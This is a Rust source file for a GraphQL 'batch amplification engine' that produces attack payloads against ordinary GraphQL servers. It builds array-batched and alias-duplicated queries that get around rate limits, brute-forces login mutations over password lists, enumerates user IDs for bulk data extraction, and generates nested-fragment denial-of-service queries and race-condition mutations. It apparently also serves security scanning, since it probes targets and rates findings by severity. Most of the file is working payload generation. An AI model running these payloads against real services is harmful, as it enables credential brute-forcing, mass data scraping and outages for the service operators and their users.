use std::collections::HashMap;
use std::fmt;

// GraphQL batch query amplification engine.
//
// GraphQL endpoints commonly support two amplification vectors that
// bypass server-side rate limiting and authentication controls:
//
// 1. **Array batching** — send `[{query1}, {query2}, ...]` as the POST
//    body. Many frameworks (Apollo, graphql-yoga, Hasura) process the
//    entire array in a single HTTP request, so N operations cost one
//    rate-limit token.
//
// 2. **Alias amplification** — a single query document can repeat the
//    same field with different aliases:
//    ```graphql
//    { a0: login(u:"a",p:"0") { ok } a1: login(u:"a",p:"1") { ok } ... }
//    ```
//    The server resolves every alias. One HTTP request, N resolver calls.
//    Rate limiters that count HTTP requests see 1; the actual load is N.
//
// Offensive applications:
// - **Brute-force** login / OTP / reset-token behind rate limits
// - **Data exfiltration** — batch `user(id:N)` across thousands of IDs
// - **Denial of service** — deeply nested or heavily aliased queries
//   that multiply resolver cost (N aliases × M depth)
// - **Race conditions** — all aliases resolve in the same event-loop
//   tick on single-threaded runtimes (Node.js), enabling TOCTOU
// - **ACL bypass probing** — batch queries with varying auth tokens
//   to map which fields are gated

/// Supported amplification technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum AmplificationTechnique {
    ArrayBatch,
    AliasDuplication,
    NestedFragment,
    DirectiveOverload,
    VariableBatch,
}

impl fmt::Display for AmplificationTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ArrayBatch => write!(f, "array-batch"),
            Self::AliasDuplication => write!(f, "alias-duplication"),
            Self::NestedFragment => write!(f, "nested-fragment"),
            Self::DirectiveOverload => write!(f, "directive-overload"),
            Self::VariableBatch => write!(f, "variable-batch"),
        }
    }
}

/// A single GraphQL operation template used as the amplification seed.
#[derive(Debug, Clone)]
pub struct OperationSeed {
    pub operation_type: OperationType,
    pub field_name: String,
    pub arguments: Vec<(String, ArgumentSlot)>,
    pub selection_set: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OperationType {
    Query,
    Mutation,
}

impl fmt::Display for OperationType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Query => write!(f, "query"),
            Self::Mutation => write!(f, "mutation"),
        }
    }
}

/// An argument slot that can be filled with concrete values during
/// amplification. Iterable slots generate one alias per value.
#[derive(Debug, Clone)]
pub enum ArgumentSlot {
    Fixed(String),
    Iterable(Vec<String>),
    BruteRange(i64, i64),
}

/// Configuration for the batch amplification engine.
#[derive(Debug, Clone)]
pub struct BatchConfig {
    pub max_aliases_per_query: usize,
    pub max_queries_per_batch: usize,
    pub max_depth: usize,
    pub include_introspection_probe: bool,
    pub techniques: Vec<AmplificationTechnique>,
}

impl Default for BatchConfig {
    fn default() -> Self {
        Self {
            max_aliases_per_query: 500,
            max_queries_per_batch: 100,
            max_depth: 7,
            include_introspection_probe: true,
            techniques: vec![
                AmplificationTechnique::ArrayBatch,
                AmplificationTechnique::AliasDuplication,
                AmplificationTechnique::NestedFragment,
                AmplificationTechnique::DirectiveOverload,
                AmplificationTechnique::VariableBatch,
            ],
        }
    }
}

/// A fully-rendered GraphQL payload ready to send.
#[derive(Debug, Clone)]
pub struct AmplifiedPayload {
    pub technique: AmplificationTechnique,
    pub body: String,
    pub operation_count: usize,
    pub estimated_resolver_calls: usize,
    pub purpose: PayloadPurpose,
}

/// What the payload is designed to test.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadPurpose {
    RateLimitBypass,
    BruteForce,
    DataExfiltration,
    DenialOfService,
    RaceCondition,
    AclProbing,
    CostAnalysis,
}

impl fmt::Display for PayloadPurpose {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::RateLimitBypass => write!(f, "rate-limit-bypass"),
            Self::BruteForce => write!(f, "brute-force"),
            Self::DataExfiltration => write!(f, "data-exfiltration"),
            Self::DenialOfService => write!(f, "denial-of-service"),
            Self::RaceCondition => write!(f, "race-condition"),
            Self::AclProbing => write!(f, "acl-probing"),
            Self::CostAnalysis => write!(f, "cost-analysis"),
        }
    }
}

/// Result of analyzing a target's batch handling behavior.
#[derive(Debug, Clone)]
pub struct BatchBehavior {
    pub supports_array_batch: bool,
    pub max_observed_batch_size: usize,
    pub supports_aliases: bool,
    pub max_observed_aliases: usize,
    pub has_query_depth_limit: bool,
    pub observed_depth_limit: Option<usize>,
    pub has_query_cost_limit: bool,
    pub has_alias_limit: bool,
    pub rate_limit_scope: RateLimitScope,
}

impl Default for BatchBehavior {
    fn default() -> Self {
        Self {
            supports_array_batch: false,
            max_observed_batch_size: 0,
            supports_aliases: false,
            max_observed_aliases: 0,
            has_query_depth_limit: false,
            observed_depth_limit: None,
            has_query_cost_limit: false,
            has_alias_limit: false,
            rate_limit_scope: RateLimitScope::Unknown,
        }
    }
}

/// How the target scopes its rate limiting relative to GraphQL operations.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RateLimitScope {
    PerHttpRequest,
    PerGraphqlOperation,
    PerResolverCall,
    PerIp,
    Unknown,
}

/// A finding from batch amplification testing.
#[derive(Debug, Clone)]
pub struct BatchFinding {
    pub technique: AmplificationTechnique,
    pub purpose: PayloadPurpose,
    pub description: String,
    pub amplification_factor: f64,
    pub severity: FindingSeverity,
    pub evidence: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum FindingSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for FindingSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Info => write!(f, "Info"),
            Self::Low => write!(f, "Low"),
            Self::Medium => write!(f, "Medium"),
            Self::High => write!(f, "High"),
            Self::Critical => write!(f, "Critical"),
        }
    }
}

/// Core engine: generates amplified payloads from seeds + config.
pub struct BatchAmplificationEngine {
    config: BatchConfig,
    behavior: BatchBehavior,
}

impl BatchAmplificationEngine {
    pub fn new(config: BatchConfig) -> Self {
        Self {
            config,
            behavior: BatchBehavior::default(),
        }
    }

    pub fn with_behavior(mut self, behavior: BatchBehavior) -> Self {
        self.behavior = behavior;
        self
    }

    pub fn config(&self) -> &BatchConfig {
        &self.config
    }

    pub fn behavior(&self) -> &BatchBehavior {
        &self.behavior
    }

    /// Generate all amplified payloads for a given seed operation.
    pub fn generate_payloads(&self, seed: &OperationSeed) -> Vec<AmplifiedPayload> {
        let mut payloads = Vec::new();

        for technique in &self.config.techniques {
            match technique {
                AmplificationTechnique::ArrayBatch => {
                    payloads.extend(self.generate_array_batch(seed));
                }
                AmplificationTechnique::AliasDuplication => {
                    payloads.extend(self.generate_alias_payloads(seed));
                }
                AmplificationTechnique::NestedFragment => {
                    payloads.extend(self.generate_nested_fragments(seed));
                }
                AmplificationTechnique::DirectiveOverload => {
                    payloads.extend(self.generate_directive_overload(seed));
                }
                AmplificationTechnique::VariableBatch => {
                    payloads.extend(self.generate_variable_batch(seed));
                }
            }
        }

        payloads
    }

    /// Generate array-batched payloads: `[{query:...}, {query:...}, ...]`
    fn generate_array_batch(&self, seed: &OperationSeed) -> Vec<AmplifiedPayload> {
        let mut payloads = Vec::new();
        let base_query = render_single_operation(seed, None);

        let sizes = probe_batch_sizes(self.config.max_queries_per_batch);
        for size in sizes {
            let entries: Vec<String> = (0..size)
                .map(|_| format!(r#"{{"query":"{}"}}"#, escape_json(&base_query)))
                .collect();
            let body = format!("[{}]", entries.join(","));
            payloads.push(AmplifiedPayload {
                technique: AmplificationTechnique::ArrayBatch,
                body,
                operation_count: size,
                estimated_resolver_calls: size * count_selected_fields(seed),
                purpose: PayloadPurpose::RateLimitBypass,
            });
        }

        payloads
    }

    /// Generate alias-amplified payloads for brute-force / exfil.
    fn generate_alias_payloads(&self, seed: &OperationSeed) -> Vec<AmplifiedPayload> {
        let mut payloads = Vec::new();

        let iterable_arg = seed.arguments.iter().find(|(_, slot)| {
            matches!(
                slot,
                ArgumentSlot::Iterable(_) | ArgumentSlot::BruteRange(_, _)
            )
        });

        let values: Vec<String> = match iterable_arg {
            Some((_, ArgumentSlot::Iterable(vals))) => vals.clone(),
            Some((_, ArgumentSlot::BruteRange(lo, hi))) => {
                let effective_hi = (*hi).min(*lo + self.config.max_aliases_per_query as i64);
                (*lo..effective_hi).map(|v| v.to_string()).collect()
            }
            _ => {
                let count = self.config.max_aliases_per_query.min(50);
                (0..count).map(|i| format!("val_{i}")).collect()
            }
        };

        for chunk in values.chunks(self.config.max_aliases_per_query) {
            let aliases: Vec<String> = chunk
                .iter()
                .enumerate()
                .map(|(i, val)| render_aliased_field(seed, i, val))
                .collect();

            let op_type = seed.operation_type;
            let query_doc = format!("{op_type} {{ {} }}", aliases.join(" "));
            let body = format!(r#"{{"query":"{}"}}"#, escape_json(&query_doc));
            let count = chunk.len();

            let purpose = match iterable_arg {
                Some((_, ArgumentSlot::BruteRange(_, _))) => PayloadPurpose::BruteForce,
                Some((_, ArgumentSlot::Iterable(_))) => PayloadPurpose::DataExfiltration,
                _ => PayloadPurpose::RateLimitBypass,
            };

            payloads.push(AmplifiedPayload {
                technique: AmplificationTechnique::AliasDuplication,
                body,
                operation_count: count,
                estimated_resolver_calls: count * count_selected_fields(seed),
                purpose,
            });
        }

        payloads
    }

    /// Generate nested fragment payloads for query cost amplification.
    fn generate_nested_fragments(&self, seed: &OperationSeed) -> Vec<AmplifiedPayload> {
        let mut payloads = Vec::new();

        for depth in [3, 5, 7]
            .iter()
            .copied()
            .filter(|&d| d <= self.config.max_depth)
        {
            let fragments = build_nested_fragments(&seed.field_name, depth);
            let op_type = seed.operation_type;
            let args = render_arguments(&seed.arguments);
            let query_doc = format!(
                "{op_type} {{ {field}{args} {{ ...F0 }} }} {fragments}",
                field = seed.field_name,
            );
            let body = format!(r#"{{"query":"{}"}}"#, escape_json(&query_doc));
            let resolver_estimate = 2_usize.pow(depth as u32);

            payloads.push(AmplifiedPayload {
                technique: AmplificationTechnique::NestedFragment,
                body,
                operation_count: 1,
                estimated_resolver_calls: resolver_estimate,
                purpose: PayloadPurpose::DenialOfService,
            });
        }

        payloads
    }

    /// Generate directive-overloaded payloads.
    /// Stacking `@skip`/`@include` with conflicting conditions can
    /// confuse cost calculators while still executing the resolver.
    fn generate_directive_overload(&self, seed: &OperationSeed) -> Vec<AmplifiedPayload> {
        let mut payloads = Vec::new();
        let selection = seed.selection_set.join(" ");
        let args = render_arguments(&seed.arguments);

        let directive_stacks = [
            r#"@include(if: true) @skip(if: false)"#,
            r#"@skip(if: false) @include(if: true) @skip(if: false)"#,
            r#"@include(if: true) @include(if: true) @include(if: true)"#,
        ];

        for (i, directives) in directive_stacks.iter().enumerate() {
            let decorated_fields: Vec<String> = seed
                .selection_set
                .iter()
                .map(|f| format!("{f} {directives}"))
                .collect();
            let op_type = seed.operation_type;
            let query_doc = format!(
                "{op_type} {{ {field}{args} {{ {fields} }} }}",
                field = seed.field_name,
                fields = decorated_fields.join(" "),
            );
            let body = format!(r#"{{"query":"{}"}}"#, escape_json(&query_doc));

            payloads.push(AmplifiedPayload {
                technique: AmplificationTechnique::DirectiveOverload,
                body,
                operation_count: 1,
                estimated_resolver_calls: seed.selection_set.len() * (i + 2),
                purpose: PayloadPurpose::CostAnalysis,
            });
        }

        let _ = selection;
        payloads
    }

    /// Generate variable-batch payloads — single query document with
    /// variables supplied as an array, tested against frameworks that
    /// iterate over variable sets (e.g., custom batching middleware).
    fn generate_variable_batch(&self, seed: &OperationSeed) -> Vec<AmplifiedPayload> {
        let mut payloads = Vec::new();
        let var_names: Vec<String> = seed
            .arguments
            .iter()
            .enumerate()
            .map(|(i, (name, _))| format!("${name}_{i}"))
            .collect();

        if var_names.is_empty() {
            return payloads;
        }

        let sizes = [5, 20, 50];
        for &size in &sizes {
            let effective = size.min(self.config.max_queries_per_batch);
            let mut variables: HashMap<String, String> = HashMap::new();
            for i in 0..effective {
                for (name, slot) in &seed.arguments {
                    let val = match slot {
                        ArgumentSlot::Fixed(v) => v.clone(),
                        ArgumentSlot::Iterable(vs) => {
                            vs.get(i % vs.len()).cloned().unwrap_or_default()
                        }
                        ArgumentSlot::BruteRange(lo, _) => (lo + i as i64).to_string(),
                    };
                    variables.insert(format!("{name}_{i}"), val);
                }
            }

            let vars_json = serde_style_map(&variables);
            let base_query = render_single_operation(seed, None);
            let body = format!(
                r#"{{"query":"{}","variables":{vars_json}}}"#,
                escape_json(&base_query),
            );

            payloads.push(AmplifiedPayload {
                technique: AmplificationTechnique::VariableBatch,
                body,
                operation_count: effective,
                estimated_resolver_calls: effective * count_selected_fields(seed),
                purpose: PayloadPurpose::RateLimitBypass,
            });
        }

        payloads
    }

    /// Generate a brute-force attack payload for a login/auth mutation.
    pub fn generate_brute_force(
        &self,
        field_name: &str,
        username: &str,
        passwords: &[String],
        selection_set: &[String],
    ) -> Vec<AmplifiedPayload> {
        let seed = OperationSeed {
            operation_type: OperationType::Mutation,
            field_name: field_name.to_string(),
            arguments: vec![
                (
                    "username".to_string(),
                    ArgumentSlot::Fixed(username.to_string()),
                ),
                (
                    "password".to_string(),
                    ArgumentSlot::Iterable(passwords.to_vec()),
                ),
            ],
            selection_set: selection_set.to_vec(),
        };
        self.generate_alias_payloads(&seed)
    }

    /// Generate a data exfiltration payload that enumerates IDs.
    pub fn generate_id_enumeration(
        &self,
        field_name: &str,
        id_arg: &str,
        id_range: (i64, i64),
        selection_set: &[String],
    ) -> Vec<AmplifiedPayload> {
        let seed = OperationSeed {
            operation_type: OperationType::Query,
            field_name: field_name.to_string(),
            arguments: vec![(
                id_arg.to_string(),
                ArgumentSlot::BruteRange(id_range.0, id_range.1),
            )],
            selection_set: selection_set.to_vec(),
        };
        self.generate_alias_payloads(&seed)
    }

    /// Generate race condition payloads — identical mutations aliased
    /// N times so the server executes them concurrently.
    pub fn generate_race_payload(
        &self,
        seed: &OperationSeed,
        concurrency: usize,
    ) -> AmplifiedPayload {
        let aliases: Vec<String> = (0..concurrency)
            .map(|i| render_aliased_field(seed, i, &format!("race_{i}")))
            .collect();
        let op_type = seed.operation_type;
        let query_doc = format!("{op_type} {{ {} }}", aliases.join(" "));
        let body = format!(r#"{{"query":"{}"}}"#, escape_json(&query_doc));

        AmplifiedPayload {
            technique: AmplificationTechnique::AliasDuplication,
            body,
            operation_count: concurrency,
            estimated_resolver_calls: concurrency * count_selected_fields(seed),
            purpose: PayloadPurpose::RaceCondition,
        }
    }

    /// Analyze batch behavior from probe responses.
    pub fn analyze_behavior(&mut self, probes: &[ProbeResult]) -> Vec<BatchFinding> {
        let mut findings = Vec::new();

        for probe in probes {
            match probe.technique {
                AmplificationTechnique::ArrayBatch => {
                    if probe.success && probe.operations_executed > 1 {
                        self.behavior.supports_array_batch = true;
                        if probe.operations_executed > self.behavior.max_observed_batch_size {
                            self.behavior.max_observed_batch_size = probe.operations_executed;
                        }
                        let factor = probe.operations_executed as f64;
                        findings.push(BatchFinding {
                            technique: AmplificationTechnique::ArrayBatch,
                            purpose: PayloadPurpose::RateLimitBypass,
                            description: format!(
                                "Array batching accepted: {n} operations in 1 HTTP request",
                                n = probe.operations_executed,
                            ),
                            amplification_factor: factor,
                            severity: severity_for_factor(factor),
                            evidence: probe.raw_response.clone().unwrap_or_default(),
                        });
                    }
                }
                AmplificationTechnique::AliasDuplication => {
                    if probe.success && probe.operations_executed > 1 {
                        self.behavior.supports_aliases = true;
                        if probe.operations_executed > self.behavior.max_observed_aliases {
                            self.behavior.max_observed_aliases = probe.operations_executed;
                        }
                        let factor = probe.operations_executed as f64;
                        let severity = if probe.operations_executed >= 100 {
                            FindingSeverity::High
                        } else {
                            severity_for_factor(factor)
                        };
                        findings.push(BatchFinding {
                            technique: AmplificationTechnique::AliasDuplication,
                            purpose: PayloadPurpose::BruteForce,
                            description: format!(
                                "Alias amplification: {n} resolver calls in 1 query",
                                n = probe.operations_executed,
                            ),
                            amplification_factor: factor,
                            severity,
                            evidence: probe.raw_response.clone().unwrap_or_default(),
                        });
                    }
                }
                AmplificationTechnique::NestedFragment => {
                    if !probe.success && probe.error_message.is_some() {
                        self.behavior.has_query_depth_limit = true;
                        let depth =
                            extract_depth_from_error(probe.error_message.as_deref().unwrap_or(""));
                        self.behavior.observed_depth_limit = depth;
                        findings.push(BatchFinding {
                            technique: AmplificationTechnique::NestedFragment,
                            purpose: PayloadPurpose::DenialOfService,
                            description: format!(
                                "Depth limit detected{}",
                                depth.map(|d| format!(" at {d}")).unwrap_or_default(),
                            ),
                            amplification_factor: 1.0,
                            severity: FindingSeverity::Info,
                            evidence: probe.error_message.clone().unwrap_or_default(),
                        });
                    } else if probe.success {
                        let factor = probe.operations_executed.max(1) as f64;
                        findings.push(BatchFinding {
                            technique: AmplificationTechnique::NestedFragment,
                            purpose: PayloadPurpose::DenialOfService,
                            description: format!(
                                "No depth limit: nested fragment accepted ({} resolver calls)",
                                probe.operations_executed,
                            ),
                            amplification_factor: factor,
                            severity: FindingSeverity::High,
                            evidence: probe.raw_response.clone().unwrap_or_default(),
                        });
                    }
                }
                AmplificationTechnique::DirectiveOverload => {
                    if probe.success {
                        findings.push(BatchFinding {
                            technique: AmplificationTechnique::DirectiveOverload,
                            purpose: PayloadPurpose::CostAnalysis,
                            description:
                                "Directive stacking accepted — cost calculator may undercount"
                                    .into(),
                            amplification_factor: 1.0,
                            severity: FindingSeverity::Low,
                            evidence: probe.raw_response.clone().unwrap_or_default(),
                        });
                    }
                }
                AmplificationTechnique::VariableBatch => {
                    if probe.success && probe.operations_executed > 1 {
                        let factor = probe.operations_executed as f64;
                        findings.push(BatchFinding {
                            technique: AmplificationTechnique::VariableBatch,
                            purpose: PayloadPurpose::RateLimitBypass,
                            description: format!(
                                "Variable batching: {} ops via variable iteration",
                                probe.operations_executed,
                            ),
                            amplification_factor: factor,
                            severity: severity_for_factor(factor),
                            evidence: probe.raw_response.clone().unwrap_or_default(),
                        });
                    }
                }
            }
        }

        if self.behavior.supports_array_batch && self.behavior.supports_aliases {
            let combined = self.behavior.max_observed_batch_size as f64
                * self.behavior.max_observed_aliases as f64;
            if combined > 100.0 {
                findings.push(BatchFinding {
                    technique: AmplificationTechnique::ArrayBatch,
                    purpose: PayloadPurpose::DenialOfService,
                    description: format!(
                        "Combined amplification: batch({}) × alias({}) = {:.0}× resolver calls per HTTP request",
                        self.behavior.max_observed_batch_size,
                        self.behavior.max_observed_aliases,
                        combined,
                    ),
                    amplification_factor: combined,
                    severity: FindingSeverity::Critical,
                    evidence: String::new(),
                });
            }
        }

        findings
    }

    /// Generate probe payloads to discover the target's batch behavior.
    pub fn generate_probes(&self, seed: &OperationSeed) -> Vec<AmplifiedPayload> {
        let mut probes = Vec::new();

        let small_batch = {
            let base = render_single_operation(seed, None);
            let entries: Vec<String> = (0..2)
                .map(|_| format!(r#"{{"query":"{}"}}"#, escape_json(&base)))
                .collect();
            AmplifiedPayload {
                technique: AmplificationTechnique::ArrayBatch,
                body: format!("[{}]", entries.join(",")),
                operation_count: 2,
                estimated_resolver_calls: 2 * count_selected_fields(seed),
                purpose: PayloadPurpose::CostAnalysis,
            }
        };
        probes.push(small_batch);

        let alias_probe = {
            let aliases: Vec<String> = (0..5)
                .map(|i| render_aliased_field(seed, i, &format!("probe_{i}")))
                .collect();
            let op = seed.operation_type;
            let doc = format!("{op} {{ {} }}", aliases.join(" "));
            AmplifiedPayload {
                technique: AmplificationTechnique::AliasDuplication,
                body: format!(r#"{{"query":"{}"}}"#, escape_json(&doc)),
                operation_count: 5,
                estimated_resolver_calls: 5 * count_selected_fields(seed),
                purpose: PayloadPurpose::CostAnalysis,
            }
        };
        probes.push(alias_probe);

        if self.config.max_depth >= 3 {
            let fragments = build_nested_fragments(&seed.field_name, 3);
            let op = seed.operation_type;
            let args = render_arguments(&seed.arguments);
            let doc = format!(
                "{op} {{ {field}{args} {{ ...F0 }} }} {fragments}",
                field = seed.field_name,
            );
            probes.push(AmplifiedPayload {
                technique: AmplificationTechnique::NestedFragment,
                body: format!(r#"{{"query":"{}"}}"#, escape_json(&doc)),
                operation_count: 1,
                estimated_resolver_calls: 8,
                purpose: PayloadPurpose::CostAnalysis,
            });
        }

        probes
    }
}

/// Result from sending a probe payload to the target.
#[derive(Debug, Clone)]
pub struct ProbeResult {
    pub technique: AmplificationTechnique,
    pub success: bool,
    pub operations_executed: usize,
    pub response_time_ms: u64,
    pub error_message: Option<String>,
    pub raw_response: Option<String>,
}

fn render_single_operation(seed: &OperationSeed, alias: Option<&str>) -> String {
    let field = match alias {
        Some(a) => format!("{a}: {}", seed.field_name),
        None => seed.field_name.clone(),
    };
    let args = render_arguments(&seed.arguments);
    let selection = seed.selection_set.join(" ");
    format!(
        "{} {{ {field}{args} {{ {selection} }} }}",
        seed.operation_type
    )
}

fn render_aliased_field(seed: &OperationSeed, index: usize, value: &str) -> String {
    let alias = format!("a{index}");
    let args: Vec<String> = seed
        .arguments
        .iter()
        .map(|(name, slot)| {
            let val = match slot {
                ArgumentSlot::Fixed(v) => v.clone(),
                ArgumentSlot::Iterable(vs) => vs
                    .get(index % vs.len())
                    .cloned()
                    .unwrap_or_else(|| value.to_string()),
                ArgumentSlot::BruteRange(lo, _) => (*lo + index as i64).to_string(),
            };
            if val.parse::<f64>().is_ok() || val == "true" || val == "false" || val == "null" {
                format!("{name}: {val}")
            } else {
                format!(r#"{name}: "{val}""#)
            }
        })
        .collect();
    let args_str = if args.is_empty() {
        String::new()
    } else {
        format!("({})", args.join(", "))
    };
    let selection = seed.selection_set.join(" ");
    format!(
        "{alias}: {field}{args_str} {{ {selection} }}",
        field = seed.field_name
    )
}

fn render_arguments(arguments: &[(String, ArgumentSlot)]) -> String {
    if arguments.is_empty() {
        return String::new();
    }
    let parts: Vec<String> = arguments
        .iter()
        .map(|(name, slot)| {
            let val = match slot {
                ArgumentSlot::Fixed(v) => v.clone(),
                ArgumentSlot::Iterable(vs) => vs.first().cloned().unwrap_or_default(),
                ArgumentSlot::BruteRange(lo, _) => lo.to_string(),
            };
            if val.parse::<f64>().is_ok() || val == "true" || val == "false" || val == "null" {
                format!("{name}: {val}")
            } else {
                format!(r#"{name}: "{val}""#)
            }
        })
        .collect();
    format!("({})", parts.join(", "))
}

fn build_nested_fragments(field_name: &str, depth: usize) -> String {
    let mut fragments = Vec::new();
    for i in 0..depth {
        let inner = if i + 1 < depth {
            format!("{field_name} {{ ...F{next} }}", next = i + 1)
        } else {
            format!("{field_name} {{ __typename }}")
        };
        fragments.push(format!("fragment F{i} on Query {{ {inner} }}"));
    }
    fragments.join(" ")
}

fn count_selected_fields(seed: &OperationSeed) -> usize {
    seed.selection_set.len().max(1)
}

fn escape_json(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
}

fn probe_batch_sizes(max: usize) -> Vec<usize> {
    let candidates = [2, 5, 10, 25, 50, 100];
    candidates.iter().copied().filter(|&s| s <= max).collect()
}

fn severity_for_factor(factor: f64) -> FindingSeverity {
    if factor >= 100.0 {
        FindingSeverity::Critical
    } else if factor >= 50.0 {
        FindingSeverity::High
    } else if factor >= 10.0 {
        FindingSeverity::Medium
    } else if factor >= 2.0 {
        FindingSeverity::Low
    } else {
        FindingSeverity::Info
    }
}

fn extract_depth_from_error(msg: &str) -> Option<usize> {
    let lower = msg.to_lowercase();
    for word in lower.split_whitespace() {
        if let Ok(n) = word
            .trim_matches(|c: char| !c.is_ascii_digit())
            .parse::<usize>()
            && (1..=100).contains(&n)
        {
            return Some(n);
        }
    }
    None
}

fn serde_style_map(map: &HashMap<String, String>) -> String {
    let entries: Vec<String> = map
        .iter()
        .map(|(k, v)| {
            if v.parse::<f64>().is_ok() || v == "true" || v == "false" || v == "null" {
                format!(r#""{k}":{v}"#)
            } else {
                format!(r#""{k}":"{v}""#)
            }
        })
        .collect();
    format!("{{{}}}", entries.join(","))
}

#[cfg(test)]
#[path = "graphql_batch_amplification_test.rs"]
mod tests;
